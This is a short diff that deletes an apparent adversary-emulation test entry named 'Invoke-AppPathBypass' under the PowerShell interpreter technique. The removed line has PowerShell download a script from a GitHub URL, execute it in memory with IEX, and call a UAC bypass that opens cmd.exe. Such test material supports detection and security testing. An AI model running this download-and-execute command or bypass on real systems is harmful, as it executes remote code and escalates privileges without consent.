@@ -1,7 +1,0 @@
-#TechniqueName: Command and Scripting Interpreter: PowerShell
-#AtomicTestName: Invoke-AppPathBypass
-#Language: cmd
-
-#commands
-Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
-
